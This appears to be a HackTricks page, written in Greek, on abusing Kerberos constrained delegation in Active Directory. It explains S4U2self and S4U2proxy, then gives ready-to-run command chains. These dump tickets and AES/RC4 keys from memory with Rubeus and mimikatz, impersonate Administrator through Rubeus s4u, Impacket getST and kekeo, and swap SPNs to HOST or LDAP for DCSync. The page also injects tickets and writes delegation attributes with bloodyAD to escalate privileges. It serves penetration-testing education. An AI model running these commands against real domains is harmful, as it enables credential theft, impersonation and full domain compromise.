# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Με αυτό, ένας Domain admin μπορεί να **επιτρέψει** σε έναν υπολογιστή να **υποδυθεί έναν χρήστη ή υπολογιστή** απέναντι σε οποιαδήποτε **υπηρεσία** ενός υπολογιστή.

- **Service for User to self (_S4U2self_):** Οποιοσδήποτε **λογαριασμός υπηρεσίας που διαθέτει SPN** μπορεί συνήθως να αποκτήσει ένα TGS προς τον εαυτό του για λογαριασμό ενός αυθαίρετου χρήστη. Αν ο λογαριασμός διαθέτει επίσης [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) στο _userAccountControl_, αυτό το TGS είναι **forwardable**, κάτι που καθιστά το protocol transition άμεσα χρήσιμο για το **classic constrained delegation**.
- **Service for User to Proxy(_S4U2proxy_):** Ένας **λογαριασμός υπηρεσίας** μπορεί να αποκτήσει ένα TGS για λογαριασμό ενός χρήστη προς τα SPN που αναφέρονται στο **msDS-AllowedToDelegateTo**. Το evidence ticket που χρησιμοποιείται στο S4U2Proxy πρέπει να είναι ένα **forwardable** ticket προς την υπηρεσία delegation: είτε ένα πραγματικό client-to-service ticket που καταγράφηκε από το victim είτε ένα ticket που δημιουργήθηκε με **S4U2Self + T2A4D**.

**Σημείωση**: Αν ένας χρήστης έχει επισημανθεί ως ‘_Account is sensitive and cannot be delegated_’ στο AD ή είναι μέλος του **Protected Users**, συνήθως **δεν θα μπορείτε να υποδυθείτε** τον χρήστη μέσω constrained delegation. Σε σύγχρονα domains, προτιμήστε υλικό **AES** αντί για υποθέσεις που βασίζονται αποκλειστικά σε RC4 όταν στοχεύετε λογαριασμούς με ενεργοποιημένο delegation.

Αυτό σημαίνει ότι, αν **παραβιάσετε το hash της υπηρεσίας**, μπορείτε να **υποδυθείτε χρήστες** και να αποκτήσετε **πρόσβαση** για λογαριασμό τους σε οποιαδήποτε **υπηρεσία** στους υποδεικνυόμενους υπολογιστές (πιθανό **privesc**).

Επιπλέον, **δεν θα έχετε πρόσβαση μόνο στην υπηρεσία που μπορεί να υποδυθεί ο χρήστης, αλλά και σε οποιαδήποτε υπηρεσία**, επειδή το SPN (το όνομα της υπηρεσίας που ζητείται) δεν ελέγχεται (στο ticket αυτό το τμήμα δεν είναι κρυπτογραφημένο/υπογεγραμμένο). Επομένως, αν έχετε πρόσβαση στην **CIFS service**, μπορείτε επίσης να αποκτήσετε πρόσβαση στην **HOST service** χρησιμοποιώντας, για παράδειγμα, το flag `/altservice` στο Rubeus. Η ίδια αδυναμία αλλαγής SPN εκμεταλλεύεται από το **Impacket getST -altservice** και άλλα εργαλεία.

Επίσης, η **LDAP service access σε DC** είναι αυτό που απαιτείται για την εκμετάλλευση ενός **DCSync**.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```
**Σημείωση χειριστή:** μην εμπιστεύεστε μόνο τα **ADUC** ή BloodHound screenshots για τον έλεγχο **gMSA/sMSA**. Αυτοί οι λογαριασμοί συχνά αποκρύπτουν τη συνηθισμένη καρτέλα Delegation, επομένως απαριθμήστε απευθείας τα raw attributes **`userAccountControl`** και **`msDS-AllowedToDelegateTo`**.
```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Protocol-transition έναντι Kerberos-only constrained delegation

Αν ο παραβιασμένος λογαριασμός έχει **T2A4D**, συνήθως μπορείς να ολοκληρώσεις ολόκληρη την αλυσίδα **`S4U2Self -> S4U2Proxy`** χρησιμοποιώντας μόνο το service key/TGT.<sup>[[2]](#references)</sup>

Αν έχει μόνο **`msDS-AllowedToDelegateTo`** (την κλασική λειτουργία **"Use Kerberos only"**), η delegation μπορεί και πάλι να γίνει abuse, αλλά το evidence ticket για το S4U2Proxy πρέπει να είναι ένα **πραγματικό forwardable user-to-service ticket** για το delegating service. Στην πράξη, αυτό σημαίνει κλοπή ή καταγραφή ενός victim TGS από το **LSASS/ccache** και τροφοδότησή του στο δεύτερο στάδιο (`/tgs:` στο Rubeus). Ένα **non-forwardable** S4U2Self ticket **δεν** επαρκεί για classic constrained delegation· αν αυτό είναι το μόνο evidence ticket που διαθέτεις, έλεγξε το [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) αντ' αυτού.<sup>[[2]](#references)</sup>

### Σημειώσεις για cross-domain constrained delegation (2025+)

Από τα **Windows Server 2012/2012 R2**, το KDC υποστηρίζει **constrained delegation μεταξύ domains/forests** μέσω επεκτάσεων S4U2Proxy. Οι σύγχρονες εκδόσεις (Windows Server 2016–2025) διατηρούν αυτήν τη συμπεριφορά και προσθέτουν δύο PAC SIDs για να σηματοδοτήσουν το protocol transition:<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) όταν ο χρήστης έκανε κανονικά authentication.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) όταν ένα service έκανε assertion της ταυτότητας μέσω protocol transition.

Αν χρησιμοποιείται protocol transition μεταξύ domains, αναμένεται το `SERVICE_ASSERTED_IDENTITY` μέσα στο PAC, επιβεβαιώνοντας ότι το βήμα S4U2Proxy ολοκληρώθηκε επιτυχώς.<sup>[[1]](#references)</sup>

### Εργαλεία Impacket / Linux (altservice & full S4U)

Οι πρόσφατες εκδόσεις του Impacket (0.11.x+) εκθέτουν την ίδια αλυσίδα S4U και το SPN swapping με το Rubeus:<sup>[[2]](#references)</sup>
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```
Αν προτιμάτε να δημιουργήσετε πρώτα το user ST (π.χ. διαθέτετε μόνο offline hash), συνδυάστε τα **ticketer.py** και **getST.py** για S4U2Proxy. Το **tgssub.py** είναι επίσης χρήσιμο όταν έχετε ήδη ένα λειτουργικό ccache και χρειάζεται μόνο να αλλάξετε το service class για τον ίδιο host. Δείτε το ανοιχτό issue #1713 του Impacket για τις τρέχουσες ιδιαιτερότητες (KRB_AP_ERR_MODIFIED όταν το forged ST δεν ταιριάζει με το κλειδί του SPN).<sup>[[2]](#references)</sup>

### Αυτοματοποίηση της ρύθμισης delegation από credentials με χαμηλά προνόμια

Αν διαθέτετε ήδη **GenericAll/WriteDACL** σε έναν computer ή service account, μπορείτε να προωθήσετε απομακρυσμένα τα απαιτούμενα attributes χωρίς RSAT χρησιμοποιώντας το **bloodyAD** (2024+):
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Αυτό σας επιτρέπει να δημιουργήσετε ένα constrained delegation path για privesc χωρίς δικαιώματα DA, μόλις μπορέσετε να εγγράψετε αυτά τα attributes.

- Step 1: **Λήψη του TGT του allowed service**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Υπάρχουν **άλλοι τρόποι απόκτησης ενός TGT ticket** ή του **RC4** ή του **AES256** χωρίς να είστε SYSTEM στον υπολογιστή, όπως τα Printer Bug και unconstrained delegation, το NTLM relaying και η κατάχρηση του Active Directory Certificate Service
>
> **Αρκεί να έχετε αυτό το TGT ticket (ή το hash του) για να εκτελέσετε αυτήν την επίθεση χωρίς να θέσετε σε κίνδυνο ολόκληρο τον υπολογιστή.**

- Βήμα 2: **Λήψη TGS για την υπηρεσία με impersonation του χρήστη**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Περισσότερες πληροφορίες στο ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) και [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Επισκόπηση του Kerberos Constrained Delegation (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Κατάχρηση Delegation με το Impacket (Μέρος 2): Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos Constrained Delegation (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Το Kerberosity Σκότωσε το Domain: Μια Offensive Επισκόπηση του Kerberos (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
{{#include ../../banners/hacktricks-training.md}}
